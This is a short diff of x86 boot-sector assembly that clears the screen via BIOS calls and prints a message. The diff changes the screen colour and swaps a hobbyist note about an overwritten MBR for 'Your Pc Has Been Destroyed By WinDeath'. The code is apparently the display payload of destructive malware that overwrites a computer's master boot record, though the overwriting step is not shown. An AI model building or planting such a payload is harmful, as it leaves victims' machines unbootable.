@@ -32,12 +32,12 @@ printchar:
 clear_screen:
         mov ah, 0x07
         mov al, 0x00
-        mov bh, 0x09 
+        mov bh, 0x04 
         mov cx, 0x0000 
         mov dx, 0x184f
         int 0x10
         ret
 
-msg:            db        "Okay Here is my tut of internet.",13,10,"so here you can se my project operative 100%.",13,10,"Yeah, MBR Overwrited :D", 0
+msg:            db        "Your Pc Has Been Destroyed By",13,10,"WinDeath",13,10,"WinDeath Made By BlastOSDev", 0
 times 510 - ($-$$) db 0
 dw        0xaa55
